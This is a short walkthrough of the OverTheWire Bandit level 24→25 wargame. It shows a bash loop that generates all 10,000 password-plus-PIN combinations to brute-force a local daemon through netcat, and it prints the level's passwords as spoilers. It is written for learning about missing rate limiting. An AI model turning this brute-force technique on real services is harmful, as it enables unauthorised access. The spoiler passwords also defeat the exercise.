# Bandit Level 24 → Level 25

### Level Goal
> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit PIN. There is no way to guess the PIN and it has no rate limiting, so we must brute-force all 10,000 combinations.

### Discovery & Logic
1. **Analysis**: The service requires two inputs: the current level's password and a 4-digit PIN (ranging from 0000 to 9999), separated by a space.
2. **Problem**: Manually entering 10,000 combinations (gb8KR... 0000, gb8KR... 0001, etc.) is impossible.
3. **Solution**: Write a Bash script to automate the generation of these combinations. By using a for loop, we can generate all possible sequences and pipe the entire output into nc (Netcat) to talk to the service at once.

### Commands Used
```bash
# 1. Create a workspace in the /tmp directory
mkdir /tmp/brute_force_pin
cd /tmp/brute_force_pin

# 2. Create the brute force script
# This loop generates "password [pin]" from 0000 to 9999
echo 'for i in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"; done' > brute.sh
```

### What I Learned
* Bash Scripting (Looping): Learned how to use brace expansion {0000..9999} to quickly generate a sequence of numbers with leading zeros.
* Brute-Forcing: Understood that without "Rate Limiting" (a security measure to slow down or block repeated attempts), a system is vulnerable to automated guessing.


### Password Found
<details>
  <summary>Click to reveal password</summary>
  <code>iCi86ttT4KSNe1armKiwbQNmB3YJP3q4</code>
</details>
